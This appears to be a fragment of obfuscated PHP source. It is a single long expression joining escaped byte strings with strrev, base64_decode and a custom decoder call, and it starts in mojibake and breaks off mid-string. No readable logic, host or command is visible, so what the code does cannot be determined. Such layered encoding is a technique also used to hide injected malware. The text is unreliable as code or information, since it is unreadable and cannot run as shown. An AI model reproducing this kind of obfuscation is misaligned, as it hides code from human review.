{ç[êıîóEšîmt½Ï­ã~ò~ÇCw')."\xe6\x9a\xfa\xea\x6b\xa9\xbd\x1b\xbf\xbd\xe8\x6e\xc5\xf1\xe7\xdd\x1e\xdf\xe7\xba\xed\x7f\xff\xfc\x8d\xe2\xed\x8b\xef\xbf\xf3\xbb\x4f\xa6\xcd\xfa\xf8\x80\xa7\xd6\x1d\xb2\xec\xb6\x8d\x4f\x55\x7c\xe0\x1e\x7c\xe0\x97\x7b\xdc\x76\x4d\xe5"."\71\67\206\133\66\250\173\107\176\57\277\334\273\374\200\155\356\75\26\235\360\227\266\177\375\261\173\356\357\16\374\152\374\261\253\345\226\47\56\375\346\350\373\367\274\362\233\113\366\270\377\246\52\257\164\264\273\171".strrev('[îçõş?İ_¦æÕpvW]cµøıÏ•Íû}Jõÿ;­_ü“¤öS~?êî›5Ğù°¿_£ıäö³¼ï').base64_decode('9dVrbtf932z/quutDf/eOWfnYUfpn34KJvCXO8eebms96u/KU8tch82/98uXb//0rduPuuvLb7565A==')."\xea\xc3\x2e\xfa\xf7\xd7\x63\x3b\x2f\x5e\x63\x7e\xba\xf5\x2d\xd7\xbf\xbf\x7d\xe5\xa8\xfb\xbf\x3b\xf6\xc6\x83\x24\x77\xdf\x35\x9b\x7\x5b\x66\x8f\x9f\x7e\xd3\x83\xd3\xae\x77\x3e\xb9\xbb\x96\x78\x39\x17\x5d\xfd\xe3\x8a\xde\x4d\xab\xef"."\274\340\361\241\217\107\177\226\171\266\365\202\13\256\57\136\175\367\255\157\274\166\347\153\157\275\161\350\7\207\355\333\365\327\207\57\377\353\352\57\16\223\6\236\277\261\276\376\372\63\377\330\273\351\224\67\237\332"."\xef\xa1\x5d\xe6\x7d\x4b\x2f\xf2\x3f\x72\x46\x64\x63\x78\xe4\xb3\x47\x1f\xfd\xf0\xb0\x63\x5f\x96\x3e\xea\x7f\xfe\xd2\x99\x3f\x6e\x54\x47\x7f\x1e\xf5\x3f\xb2\xf5\xbc\xfd\x37\x7c\xd0\xd8\xb8\x78\xce\x93\xdf\xbe\x7d\xd5\x86\x9f\xad\xdf".strrev('éöÁàÿ˜ç¶Rö­xõ5ŒgG+Ğèù9=?[\'·{=ê>ZÎµ_´ÊÇ²û¹gëäó|‹øtİî').strrev('\'¼"	…«Ø,â#¨hh±&}‘VÇ¤(›7fÄ´JŠD‘ùf¢×9"…»B`Rˆê³šjoa5û¯Ë')."\x52\x45\x3d\x3f\x41\x8c\x93\x8c\xb1\x55\x85\x51\x7a\x12\x1b\xd7\x46\x72\xb1\xb1\x55\x4\xcd\xd4\x33\x13\x79\xa2\x82\x98\xdd\x48\x4e\xc0\x72\x66\x4a\x31\xa\xa4\x3a\xa3\x63\xe3\xc5\x2\xdd\x56\xe7\xe3\xb9\xa4\xb2\x8a\x6c\x58\x72\x13".strrev('œ–xÉ›\')ˆÇ\'ÎQXù%bfã£È6’55k±UñatA?9i’ÄFçêRG1DÄÍfÅ$ÚbÉ')."\216\304\22\343\32\335\52\315\234\111\152\72\163\66\351\312\142\276\240\230\151\322\336\71\115\244\157\46\306\165\171\164\45\251\141\114\311\346\13\111\252\63\217\33\53\127\215\221\206\347\362\205\221\361\11\262\307\250"."\xaf\x9f\x4b\xca\x26\x56\x51\xb3\xe9\xef\x1c\xd2\xd1\xf1\x54\x5a\xcb\x50\x1d\x88\x3e\x36\xae\xae\x2c\xb0\x53\x15\x25\xb6\x92\x9a\xa9\xaa\x29\x2d\x96\x50\x48\x64\x65\x16\xc\x1c\xd5\xb4\xcd\xa1\xb5\x96\x47\x95\x71\x4d\x27\xcd\x9d\x35"."\273\211\176\220\174\121\117\45\324\364\104\201\22\13\371\272\231\310\346\125\322\137\246\236\32\313\214\250\264\127\346\220\115\325\150\102\231\130\105\217\353\262\243\162\46\101\124\310\163\147\221\66\314\231\113\2\215\224"."\6\147\65\221\1\231\75\227\324\156\56\31\304\372\106\122\256\76\232\113\244\150\47\217\114\244\123\112\261\100\107\223\124\171\346\134\322\210\104\154\164\245\101\17\163\233\232\310\327\306\47\62\51\166\144\335\104\51"."\x37\x93\xd4\x8d\x98\x36\x42\x2b\x44\xfa\x7f\xf6\x4c\x92\x1c\x4b\xcb\x4a\x96\x8e\xd5\x1c\x52\x17\x73\x7c\x54\x5f\x45\x55\x8d\x8d\xb3\xc8\x80\xab\xa3\xd9\x74\x66\x8c\xd4\x70\x55\x7e\x2c\xa5\x8c\xd2\x1a\xd2\x6\xcf\x9e\x43\xdb\x59\x5f"."\107\251\225\100\342\343\131\103\245\126\356\205\354\330\150\314\120\51\105\221\317\326\67\221\116\231\105\53\222\57\232\253\62\264\123\352\151\235\33\351\130\64\316\44\205\33\253\264\261\304\112\242\371\250\237\75\207\216"."\3\51\157\74\21\7\333\157\242\162\156\244\137\311\245\223\246\36\43\63\261\261\236\364\155\166\345\210\46\307\351\311\65\30\337\21\215\324\263\251\201\174\155\116\135\75\245\142\122\124\61\231\111\144\307\10\173\30".strrev('ÒÔÊPgDØjO2z+!¶Ó¬ŒË¥(Èì™Sç})ê`dÙÜÓt‡0ŒÇI\\ÎzªÌ[‚\\ıCŒœj*ŒË')."\172\222\236\50\24\222\305\170\236\152\27\365\334\310\30\245\26\131\31\313\245\213\131\72\264\244\247\146\326\223\246\351\61\105\115\216\114\120\236\105\352\276\162\124\235\110\24\151\331\231\125\43\331\70\351\114\100\20".base64_decode('xUSStDWuqKmV44Rs9Mx4Ts2S9s5uILWcKKSzakyj1Ei+uspMjk4oeTpFSOcUDTk2Rs/T59aTrtbkbA==')."\174\145\222\14\311\262\54\141\16\355\162\174\204\252\250\15\123\66\13\206\15\201\136\265\210\213\246\270\43\12\375\150\202\232\232\362\123\160\243\200\354\303\151\72\327\200\100\45\226\160\132\16\243\41\21\67\236\63"."\205\144\20\263\244\102\135\77\124\324\340\130\310\324\164\146\63\200\315\174\134\260\126\56\153\43\50\301\21\214\104\314\222\316\240\124\245\143\117\111\332\341\61\324\135\314\210\2\376\107\32\203\57\350\30\140\152\53"."\xcc\xce\x1c\x63\xbb\x68\x1f\xc5\x84\xbe\xc6\x1a\x77\x53\x36\x46\x5c\x22\xd8\x29\xa6\xaa\x39\xf0\xe9\x4c\xc6\x65\xbd\xb8\x5\x6f\xf1\xd0\xa1\x89\x72\xab\x5e\xde\x42\x7e\x30\x2a\xc0\x78\xbf\xa\x5d\x61\x1d\x28\xc1\x48\x2e\x9f\xd0\x18".base64_decode('NGFYLpTRRX8CRoWwrcUuXrMqGKwu1+NCrUhb3bCtblSg0E4xDdeCJ9rGUGxSimmoubqUVJDXjpxGlA==')."\x74\x24\x1a\x7a\x2b\x45\x5a\x88\xc2\x4a\xcb\xe4\x34\xf\x5d\xb9\x72\x48\xf8\x83\xe\x9\x1d\x13\x4a\xd6\xeb\x40\x7e\xaf\xc4\xce\x53\xc5\x91\x17\x2b\xa9\x2b\xf9\x8c\x1c\x67\x15\xcc\x4f\x48\x49\x19\x64\x4d\x34\x4b\x49\x30\x1\x24\x6a".strrev('0‹%@ƒR¡%uNÈLaÙGW–ôè¨àÃddu§NrÕÄÔÇ ‰,s{(L±m+ÏU‹'."\r".'™.Œ')."\251\165\55\72\154\141\226\210\361\214\42\353\226\203\36\154\141\216\303\55\363\363\351\74\274\146\151\316\233\117\56\175\221\323\254\250\120\7\22\346\146\341\42\64\143\77\110\242\123\314\345\155\27\356\103\102\64\41".base64_decode('BzZwmgcZUSuHkgUvB8PBQg6mNgvZKY93cVy5lqcriWmkCcLHxggCzdtr7S3QJCfrQNARgC8nDGR2RQ==')."\146\12\51\322\20\156\201\5\171\337\303\354\150\50\276\47\253\51\166\116\36\360\376\34\263\242\62\62\62\75\272\62\300\202\240\346\24\66\152\5\203\33\235\262\53\1\144\275\63\315\174\64\236\321\50\27\3\43"."\36\115\250\4\271\307\337\36\365\372\203\174\25\242\127\175\74\375\376\150\50\24\20\156\14\64\13\314\6\136\136\340\147\234\60\306\57\61\300\243\4\361\374\323\60\306\64\235\364\37\274\323\10\315\72\103\22\271"."\x53\x5\x6\xbd\xa3\xdb\x13\x64\xa6\x9b\x8d\xae\x3a\x57\x3d\xc7\x5\x1f\x8c\x42\xb\xd6\x56\x7a\x7\x2b\x14\xf6\x4\xcb\xdc\x6f\xc5\xf7\x5e\x49\x7f\x93\xbb\xae\x24\x43\x77\x60\x50\xea\x8\xf4\xc\xf4\xf6\x85\xf0\x85\x4e\xc\xef\xb"."\x8\xe9\xc8\x40\x8f\x24\xd3\xdb\xaf\xa5\xc9\xa4\x78\x5f\x7f\x8f\xa7\xc3\x27\xf9\xfb\xc2\x1\x6a\x81\xcb\xcc\xb2\x90\xed\x75\x88\xc5\x69\x17\xe8\x86\xc2\xee\xb5\x92\xfc\x38\x22\xda\x87\x8b\x25\xb2\x92\x8\x85\xe\x39\x2a\x23\x15\x91"."\232\110\125\244\172\205\53\142\14\273\305\41\41\153\101\277\227\64\251\231\205\330\2\322\33\12\55\46\367\11\2\101\117\107\17\375\174\273\47\104\202\201\16\77\16\354\74\353\306\167\357\72\155\347\5\33\267\237"."\x7c\x2a\x28\x68\xc7\xf9\xc7\xee\x38\xf7\xb6\x77\xef\x38\x75\xd7\x71\xf7\x6e\xdf\xf8\xbb\x9d\xf7\x9d\xb6\xe3\xac\x4d\x3b\x7e\x77\xc\xa9\xf3\xae\x4d\xb7\xbf\x7b\xef\xfd\x3b\xcf\xba\x66\xfb\xc6\xf3\x76\x9c\x73\xe7\xce\xf3\x7f\x8b\x13"."\336\373\343\215\333\327\135\303\52\46\275\167\346\175\73\116\273\162\307\331\67\354\70\165\343\366\273\316\334\176\317\261\333\357\270\303\1\162\277\167\374\251\73\357\335\270\343\244\163\166\134\176\364\216\133\117\331\261"."\xe1\xd4\xed\xeb\x2e\xdd\xfe\x87\x6b\x76\x9e\xb6\x69\xfb\x65\xc7\x6d\x3f\xe1\xd4\x5d\x9b\xce\x9e\x66\x27\x1e\x1c\x1f\xa2\xdd\x4f\x4e\xb1\xdd\xcb\x23\x46\x4d\x15\xee\xd2\x88\x51\xb\xbb\xb3\x1a\xfc\x56\x41\x23\x5e\xf0\x4b\xed\x15\x1".strrev('Lš²‰˜»ABúñ•	J…Ìd5‹ZNT@.Š<i‰ Ã3Q *˜5À‹’Œ^(İŸ¾¤'."\r".'à…É')."\311\341\70\200\206\202\113\130\230\135\11\51\271\276\55\125\121\2\256\226\54\15\221\135\161\55\123\310\346\120\145\245\12\150\205\122\341\200\314\27\11\37\122\5\134\110\0\100\211\203\351\126\5\157\201\42\353\266"."\xca\x65\x95\x8e\x3a\x47\x7d\xb5\x44\xee\x76\xe3\x1c\xe4\x2e\xb7\x54\x41\xec\x1c\x59\x3e\xcb\x47\x1c\x31\x4b\xac\xde\x51\x57\x2d\x55\xe4\x47\x2a\x48\xbd\x78\xbf\x82\xda\x47\x31\xa6\x21\xc9\x8e\x2a\x52\x61\xb1\xba\x1c\x17\x30\x44\xc3"."\xd4\x65\x35\x67\x1a\x52\xdc\xc1\x40\x2c\x3f\xf8\xb5\xdc\xcf\x8e\xbb\x78\xe\x3c\x4e\x0\xc3\xe\x93\x3c\x7d\x5e\x2b\x26\xbe\xd6\xdd\x5f\x29\xc9\xb9\x4\x48\xc1\xfd\x2b\xe\x73\x65\xb5\x14\x23\xc6\xb7\x65\x12\x51\x36\x4b\x67\xb4\x5a"."\x3a\xa3\xaa\x96\xf0\x86\xfe\x2e\x36\xde\xd8\x5e\x56\xc2\x17\x2f\x70\xb5\x64\x83\xe\x14\x81\xa2\xa1\x82\x50\x3c\x5a\x14\x57\x3\xcd\x0\x83\x83\xf1\x41\x80\xa5\x8c\x28\x13\xbc\x24\xc0\x82\x58\x2\x1d\x41\x8\x67\x83\x58\x26\xd\xdd"."\xb7\xaf\xc0\xc2\xf\x6e\x67\xd6\x48\x51\xf6\x46\x2e\x7c\xf7\x2e\x63\x6d\xa0\xb4\x4c\x86\x40\xe1\xb7\xf5\xe1\x15\x12\x5f\xb8\xa3\x1b\x53\x79\x48\x20\xf3\x44\x6c\x86\x85\x50\x79\x77\x4a\x16\x12\xc9\xd0\x8b\x99\x4\xf\x4f\x17\xc8\x10"."\366\101\170\376\276\316\100\260\27\137\235\10\165\164\373\172\75\56\302\270\61\45\140\174\50\142\110\255\122\45\344\174\30\124\151\351\176\364\41\332\145\141\364\125\60\257\242\246\142\230\270\27\362\51\122\31\62\372"."\22\272\324\47\243\54\255\225\370\266\54\51\222\71\227\10\4\303\121\320\1\204\75\13\134\267\122\130\41\104\13\317\202\256\27\231\200\53\307\301\216\213\136\16\217\121\37\24\240\160\130\146\107\240\257\323\117\157"."\211\170\143\226\64\157\320\17\157\150\222\317\112\264\204\50\77\354\7\221\374\130\202\205\371\235\104\230\300\126\164\20\341\13\72\114\21\134\141\300\317\204\372\130\230\113\160\40\2\155\350\70\157\35\364\262\160\67"."\xbb\xb9\x5\x13\x2\x41\x21\xe2\x9\x7a\x7a\x43\x2c\x1a\x1c\x4\xbc\x1a\xc2\x84\x8b\x4c\xbd\x9e\x50\x18\xb4\xaa\x6f\xa0\x97\xf3\xf3\x1e\xcf\x12\x40\xa\x1\x2e\x72\x50\x5e\x5c\xe5\xaa\x99\x5f\x1d\xc1\xd7\x34\x70\x10\xff\x2c\xa0\x31".base64_decode('aN4+vLreIc1eW01w6MWGqJlWc1QwhF9Z3BPtCXThOHLR4csluMAtDUlACA1zIdSgCxOjdQlQqITvfg==')."\111\175\201\101\17\367\367\40\44\140\10\21\163\45\356\5\302\275\174\50\62\26\161\1\51\300\130\301\157\137\170\333\45\52\137\164\300\353\232\344\52\0\311\355\241\153\345\12\7\131\26\242\31\55\305\144\274\76"."\x2f\x95\x9\xf0\xef\x52\x1a\x40\xc\x91\x64\x0\xdb\xb4\x7c\x86\xea\x62\xf0\xfd\x8f\x68\x64\x4d\xe4\x88\x88\xd3\x85\xaf\xbc\x40\xa9\x24\xe2\xe0\x55\x8a\xfa\x96\x82\x85\x34\x14\xb2\xdc\xd7\x89\x22\xc7\x7\xa4\x74\xd0\x58\x12\xc2\x53".base64_decode('E0dayA/ZWbSQLiDRtlY2pr7Fa/rAX1d4jQ/89YCfnjAYNZUhgHnX41/kWwP/4QnVrCOxMb01g79vDQ==').base64_decode('+BdwkTX+Pnth7b7woM+HEWiY/HJUwFVIUwVPLgsD9LqW1OPrDEswTqsRjVahznQO11ZHo25jgJANuw==')."\13\133\125\71\275\276\222\54\24\236\120\7\147\261\26\202\50\245\5\144\110\154\45\4\346\231\204\304\273\202\201\201\176\41\336\355\131\342\357\353\242\61\167\15\15\325\120\107\12\136\177\10\164\121\7\45\106\356".base64_decode('MEWME6kSyT6iOGuhbC9g3yAiyOJQysfs1zrZ2gf8PV7xiiJEJKsGYt1k4ZhBK0fj6LIijcAup2FEbg==')."\64\202\372\200\106\160\7\320\30\352\56\32\101\216\131\150\4\65\224\106\340\266\303\327\107\323\300\276\16\354\311\350\146\55\305\15\120\323\162\221\135\267\231\227\210\11\327\145\41\47\166\141\17\34\360\346\64\330".base64_decode('E8pMhWXTRCEtiw+OKVkjkL2ZJNz6gyotQTHixhhA2EQ44DeyYj4ShldQksU3zcywamYsHyV3WcBH/Q==')."\350\162\217\360\131\262\234\163\115\12\66\372\214\152\202\215\73\276\3\103\264\153\134\137\141\335\25\61\216\264\202\155\166\310\355\163\7\371\325\171\263\254\126\173\20\102\350\140\52\376\211\20\334\10\251\1\271\244"."\x53\xe9\xa0\x2b\x71\x94\xdf\xfd\x34\xf5\x82\x60\x22\x8a\x2c\xe2\xc0\x80\x78\xf8\xb5\x2e\x66\xd1\x89\xd2\xa\x31\x88\x2c\x76\x3c\xd2\xa\x81\xc1\xa0\xb7\xae\x90\x58\x40\xaa\x6e\x6a\x12\xc7\xb2\x1a\xa2\xd2\xab\x9f\xd8\xcf\x8d\xdd\x94"."\x4d\x4\x73\x6b\x38\xa6\x74\xa5\x46\x78\xaa\x49\x4f\x90\x48\x86\x1\xe1\xc6\x95\x9c\x10\x4c\xdf\x58\x3d\x90\x92\x2d\x67\x75\xdd\x2\x6\x3e\x13\x85\xd7\x24\x81\x58\x13\x55\x78\xdb\xb2\x8a\x61\x30\xdd\x2e\x5a\xe6\x69\xd0\x4c\xf3\x3b".base64_decode('aqKHGm877cdCzgwpGeInwRtDdoTcmpx1qiHYFyLtFu8l7A7IlpGU5GcNF7A4sIf7ooHKJF7mKpXqjA==').base64_decode('WQ1yWr+iZ1WkHhvkdsEsXegPZHytfV9PFnLgC/1sGJ31FJn6DUOUIzHpixm7gvFDeQX7TMQISLF6Bg==')."\x93\xd7\x34\x5b\xe5\x4c\x4d\xeb\x95\x73\x13\x61\x6d\x89\xaa\x10\x7a\xf5\x6\x6\xfb\x7a\x2\xd4\x7f\x6\x75\xb6\x43\xb8\x10\x39\xd8\x5\x3b\x18\xdd\x45\x23\x26\xd\xe8\x32\xf9\xf2\x20\x5d\xa5\x10\x5d\x73\x5f\x6a\xd3\xc4\x1\x47\x23"."\307\11\320\23\354\350\6\362\145\264\323\17\304\152\337\122\42\303\55\12\170\243\241\300\100\220\152\70\140\34\335\245\10\372\72\226\61\305\3\203\166\172\226\330\41\260\270\260\247\253\54\230\111\227\20\216\370\167"."\x34\x18\x80\x42\xb6\xaf\xa7\xd3\x96\x21\xd4\xcd\x9c\x92\x58\x61\xd1\x1e\x7f\xdf\xa2\xb2\x9\xe1\x40\xb4\x57\xc8\x82\x81\x60\xab\xdd\x6b\x87\x59\x4b\x8\xf9\x60\x57\xf0\x78\x7b\x4f\xa0\x43\x48\xf6\x7\x4a\x7b\x2\x2c\x1a\x36\x20\x96"."\xd5\xe9\xc2\x5e\x15\x59\x8d\x38\x75\x33\x60\xd8\x89\x35\x70\x99\x77\x46\x81\x94\x30\x3f\xb2\xb6\xba\x2a\xe2\x9e\xef\xaa\x61\x42\x2a\x1e\x1a\xe1\x82\x40\x79\xb0\x6a\x84\x2d\x6c\xcf\xed\x72\x91\x2\x58\x0\x88\xc8\xec\xa6\x34\xa5\x36".base64_decode('4vUphO+UWr5AJIu1gpMTeDnFZXeK4sc6xGhoWYj1JF4zyqVbaAejiTpwGzL46xdRw0o2XxbRQnyWKw==')."\24\42\310\245\152\274\207\360\42\46\136\335\302\110\34\143\265\252\65\323\71\27\57\300\213\255\274\277\371\174\5\40\27\147\114\244\44\276\233\42\263\325\51\172\320\202\275\56\362\330\104\314\66\365\10\200\273\142"."\21\46\50\7\66\320\43\270\145\316\254\63\21\11\167\101\37\33\221\43\131\5\125\135\360\165\21\327\162\11\125\270\306\43\307\51\73\55\304\107\350\205\3\264\136\31\316\61\225\166\301\164\166\157\226\34\377\104"."\x65\x74\x3\x3c\x2a\x9e\xdc\x8d\x3a\xd\x35\x95\x73\xca\x99\x94\x6\xb8\x6d\x3a\x4b\xa1\xf2\x88\x25\x9d\x3b\x5c\xc9\x6b\x60\xf\x4d\x5d\x21\x3a\xc1\x27\x84\x34\x8c\xc\xa\xa7\x8b\x8\x54\x6f\x33\xbf\x39\x30\x62\xb0\x98\x48\x39\xb0"."\117\331\51\7\277\244\47\254\33\41\124\345\146\151\26\161\121\325\11\126\64\301\52\235\72\35\342\327\267\40\233\104\136\231\310\332\57\161\227\166\124\22\57\317\303\241\324\47\230\331\123\6\221\35\341\47\55\331"."\x11\xa6\xa2\xa7\x62\x1\xad\x7a\x51\xe9\x14\x4e\xcc\xf8\xc6\x9c\x78\x9b\x3\x69\xed\x13\xf4\x10\x8a\x18\xc5\xb7\x4f\x40\xb3\xfd\x92\x85\xe\x5e\xa6\x12\x5d\xf0\x79\x6\x43\xb3\x9c\xdd\xbd\x9e\xe\x27\x60\x73\xd\x8d\xc4\xec\x63\x59"."\26\320\116\267\312\50\107\36\63\146\121\331\1\103\152\147\113\151\320\325\204\44\112\75\317\114\267\272\201\302\100\354\77\5\310\250\11\170\224\101\7\1\103\155\244\202\201\134\316\301\161\174\57\237\36\232\245\145"."\x56\x61\xd8\xc\x1c\x2a\xf7\xdd\xa5\x65\xbf\xbb\xb4\xdc\x77\x97\xda\xbe\xbb\xb4\xf4\xbb\x18\x64\x23\x49\x39\x9f\xef\xc0\x6e\xe7\x44\xc6\x61\x1\xc5\xc5\x8\xe5\xc0\x49\x78\x50\x23\x1e\xf8\x10\x69\x1c\x1f\xb8\xbb\x40\xb2\x57\x35\xa0".base64_decode('LJ9g+AYPMbJPChPCUtx/9Hkk0SWBFQQlLMTWMSQjGyYUPLjWA17e7GXCjk4p2q0ZRhn/UoEQVUhYmw==')."\206\275\265\12\102\66\271\325\316\74\366\60\177\76\334\351\17\336\107\342\260\217\335\316\354\225\307\75\51\45\244\100\176\106\72\307\67\236\327\14\105\164\67\225\120\220\247\22\166\65\107\160\326\224\225\307\41\307".strrev(')À,³£!\\½Î ÙË¹jod_s?~rgæAHÅB2ŠÜÛ¦‚w²øµ™ÃûtHÑê&Û‚¥‡¡')."\134\173\303\354\101\360\315\6\152\110\76\2\53\114\46\164\32\365\22\335\45\340\237\43\313\265\337\251\163\137\123\140\124\261\143\302\105\312\4\365\332\144\233\22\66\107\117\221\256\110\157\44\54\166\230\251\313\311".base64_decode('JKi24ELGUpfvc0VFNtNHlHU+RRKRize3jlynOcaijE6RJ9QylLoYwgmtJrkdQb4guOQVqQMuzsyBKg==')."\334\50\140\17\140\224\117\10\173\12\344\244\213\170\32\144\136\263\100\117\345\332\265\4\131\364\126\127\0\22\254\150\256\230\136\5\176\253\53\34\25\120\250\102\161\70\150\20\200\252\124\321\74\275\12\5\252\311".base64_decode('RdBVxDRLcI7DVbpktzBfNk1BAzEfdQyc0w3uBvcYYRvzR+EXuetQ+xowHgVsj3qYi4rMl7B1MgBiSg==')._kodDe('MZgkUvaquDPLMreqKic0qKaDl9DmecbJMaI4w0PXqBIXONeiow1f1smXWcyJkiPwkhOWkjrXBI4DHfw=')."\354\130\265\215\50\20\132\340\274\142\21\267\65\66\131\136\302\236\262\362\52\55\7\226\72\300\232\262\256\70\351\314\1\306\276\270\7\261\234\142\216\151\72\321\273\22\66\331\120\67\113\44\141\102\55\6\231\156"."\xf8\xbe\x6a\x33\xd4\x43\xd0\xe6\xf\xe4\x27\xa\x39\x67\x7\x58\xe9\x9d\x58\x68\x69\x2e\xb7\x80\x35\xd7\x59\xf1\xa1\xaf\x5c\x2b\xbe\xc8\x13\xe3\x9c\x5b\x64\x79\x10\xfb\xbb\x6c\x96\x44\x27\xa8\x82\x7f\x26\x27\x94\x9\xf0\x24\xa4\x5b"."\x56\x2\x83\xec\x92\x82\x54\xd1\xdb\x15\x25\x71\xc8\xb\xa3\x56\x5e\xb8\xc0\x56\x5f\xd8\xd5\x4e\x20\x67\x41\xfa\x7\xf3\xb\x2c\xbf\xa6\x52\xe\xc5\xea\x69\xd3\xee\x7f\xd3\xde\xb\x28\xb\x1c\x5c\xa7\xe8\xd8\x73\x1c\x88\xd4\x30\x19"."\172\337\163\302\361\165\252\211\311\122\370\374\56\133\325\70\41\225\162\50\3\5\65\141\377\44\122\165\73\13\5\372\301\262\205\212\2\77\105\100\215\360\263\362\54\242\267\14\306\232\111\333\166\351\135\320\1\225"."\272\261\3\223\127\152\230\331\334\70\27\374\237\160\112\252\251\57\344\315\126\26\244\156\356\246\271\223\224\17\160\267\234\264\155\160\300\55\116\375\4\60\357\106\66\303\51\3\261\340\361\332\132\234\272\222\206\342"."\xbd\xa6\xe0\xca\xb0\xc\xc3\x4c\x28\x45\xba\x3e\x92\xe5\x51\xf0\x4b\xc9\xfa\x3d\x45\x3\x3a\xc3\x97\xf9\x4c\x88\x65\x46\x78\x85\x63\xd0\x6\x88\x10\xf2\x8\xa8\x8f\xc6\xa5\x29\xb4\x90\xa\xfc\x3b\x9e\x2e\xe4\x46\x5a\x85\x44\xc9\xd4"."\64\51\53\347\46\210\234\77\303\150\236\141\140\133\245\31\256\131\111\3\104\10\133\146\356\177\340\312\301\135\172\340\213\304\44\5\153\340\134\320\347\253\13\56\113\301\2\301\352\317\24\230\47\315\74\12\223\32"."\366\367\14\164\371\373\204\103\65\1\20\355\360\366\105\75\375\375\145\23\230\100\142\252\161\67\324\77\273\126\122\27\327\161\112\74\55\152\66\45\305\241\341\131\153\5\204\126\110\206\36\247\116\220\52\334\204\135"."\42\4\276\63\152\121\111\226\112\230\105\112\2\152\160\242\20\116\256\154\153\161\253\155\254\263\371\35\151\135\343\366\163\56\367\341\160\237\344\206\347\125\271\43\340\350\212\72\163\4\355\344\67\242\45\251\105\226"."\x70\x3f\xb6\x56\xc2\xc3\x84\x64\xa5\x94\x6\x2b\x30\x3b\x91\x6f\xb3\x67\xee\xa3\xea\xde\x16\xb7\x2c\x26\xc2\x9\x14\xd4\xa8\x44\xcc\xf6\x4a\x45\xa6\x6e\x2b\xab\x47\xf4\xc4\x6d\x3e\x31\x3b\xe4\xdc\x92\xd2\x2c\xb0\x70\x57\xbc\x5c\x92"."\x1b\x6d\xde\xdd\x82\xaf\x58\xa2\x6d\x10\xcd\xa7\x2c\x4e\x49\xac\x1a\x55\xa6\x97\x2c\x43\x20\x2e\xe6\x21\x3b\x2f\xc7\x47\x20\x75\x71\x8e\x8f\x11\x5d\x24\xa1\x1f\xee\x4a\x70\x82\xc5\xb9\xa3\x29\x9c\x10\x80\x26\x80\x8f\xc2\x5d\xa9\xce".strrev('2,PwÍD8qàİ¼xºúzqBH‹0gë.–Ö7‘R;UäòO`cb0¥µÚü‹‚^®è=')."\124\351\252\131\273\326\255\322\103\271\110\205\65\257\213\141\343\170\304\145\305\7\65\47\135\315\20\11\300\216\211\245\305\205\144\342\115\161\327\160\43\123\166\370\46\301\23\271\326\326\266\41\246\231\35\246\151\124"."\316\123\353\233\350\160\257\112\73\303\203\54\330\321\147\365\35\34\5\42\254\315\67\260\370\126\6\233\3\230\335\270\220\17\140\217\325\1\325\374\42\363\263\52\232\14\342\260\47\237\27\243\364\315\15\350\307\306"."\x9d\x51\x63\x6e\xc6\xc\xdc\x8\xe6\x8a\x73\xbb\x57\x8a\x82\x58\x91\xd\xe\xf\xd7\x6c\x9\xd0\x85\x31\x2\x17\x1\xaf\x4\xb2\xd7\x4a\x3b\x1c\x94\xc5\x80\x2c\xd0\x62\xc4\x75\x35\x6f\x5a\xd8\x18\x7e\xc5\xa1\x2\x79\xc6\x5d\x29\x17"."\145\214\122\41\121\347\361\25\310\35\140\5\140\133\70\205\360\13\136\225\26\310\237\44\135\311\264\126\240\352\32\151\105\1\371\21\7\52\367\21\220\261\102\242\314\63\53\263\36\323\115\15\54\177\314\162\224\70"."\312\36\10\22\333\74\117\337\62\34\40\202\325\341\313\361\357\364\303\331\100\102\317\354\31\105\307\6\110\210\51\41\165\176\222\53\263\210\337\356\376\140\40\34\350\240\136\206\313\151\275\146\121\51\326\300\246\304".strrev('[˜	(©gpX7Ï´0À·¡_&¥®¹Z«dPP Gc—!zü2&à\\˜1Y–ùCCã|').strrev('‹ÊqL5¨t•¢şŒ×WR€”jôÍä6Ggÿ«¬çWWPÒçõ2—éRÆtyar+“/').strrev('{NÅÑˆË)hô7{Ä6$ósöÌQ”Í+?"g@h+kkY¬ºæ€ê.T'."\n".'æ« •‘'."\n".'¢˜Â')."\x1a\x6\x92\xb\x18\x2b\xd4\x2d\xb4\x9b\xe9\x61\x2f\x40\xe3\x54\x0\xea\xe1\xcb\x25\xc8\xce\x63\x1e\xb6\x69\x6f\x15\x3f\xe6\xa2\xdd\x2b\x2\x45\x8d\xba\xe5\xab\x0\xf\xac\xa7\x71\x56\x61\x8\x10\xd4\x15\x50\x9e\x12\xdc\xcb\xc0\xa8"."\x78\xf6\x89\x92\x99\x79\x34\x8a\x65\xd8\x55\x19\x18\xed\x63\x25\x95\xa3\xaa\xb4\x36\x16\xe5\x8b\x22\x8c\x2e\x64\x31\xd4\x13\x70\xbb\x42\xe9\x87\xb5\x99\x74\x7\xe5\x85\x94\x5e\xe8\x11\x1f\x39\x31\x44\x57\x4d\x46\xd4\x8c\xe5\x2e\x43"."\124\50\133\364\232\11\130\16\224\166\351\140\142\75\72\371\0\24\224\134\234\16\220\363\62\364\6\5\266\13\150\236\42\364\244\256\361\33\5\45\117\253\320\130\250\374\371\263\240\242\242\260\111\60\231\6\213\102"."\x7c\x14\x80\xcf\x76\x3b\x98\xa3\x17\xa1\x0\x7b\x92\x2d\x8f\x27\x21\x3c\x1d\x62\x70\xf\x2f\x1d\xcc\x99\x93\xe8\xf6\x5\xfb\xb4\x11\xe\x51\xd\xe2\x31\x90\xbb\x79\xa2\x65\xb0\xd6\x17\xf4\x8c\x2b\xaf\x6b\x29\x30\x12\x86\x50\x2f\x8".base64_decode('7y8PZuilmGWQWINEPBEIjS7oqxWEqJhOHmwKGacUULk9vwC0mkUICR3MV7EIhBuXAWHbie4wWcuAOw==')."\x22\x2b\x84\xd5\xec\x7b\x48\x88\x6e\x58\x4d\xf2\x32\x8a\x70\x29\x85\xa0\x71\x2b\x10\xa8\x4c\x10\x75\x9d\xaa\xd6\x41\x68\x7\xf6\x6\x3f\xc1\xb3\xc2\x4b\xa8\x8c\xcc\x10\xca\x1d\xf1\x14\xb2\xa6\xbd\x73\xc2\x7a\x1a\x38\x93\x62\xc1\xc6".strrev('íE·(\\‰Ï!p2‘³ÊNp)AhŞ­“…Bc`b—šÀÎhÔ2P¬:†Q¾=›¦“…É¨•½3').base64_decode('iGWalOtRb285dsMW9h8eMBwv8wWSiWVx0RNKVzyZsoEYnZYAFL4TQea7QO6lrLZXWwVYoexudNVJVQ==').base64_decode('gyqQ3MYMqS8szXY1zJMGA4OzZ1VLQIbMKINKbJFquhtnznHNnC1VLeoO9/Y4JOg3TuoCMqlWLXWkdQ==').base64_decode('Lau4G+bASyOzGme65s6SQnJS1lWS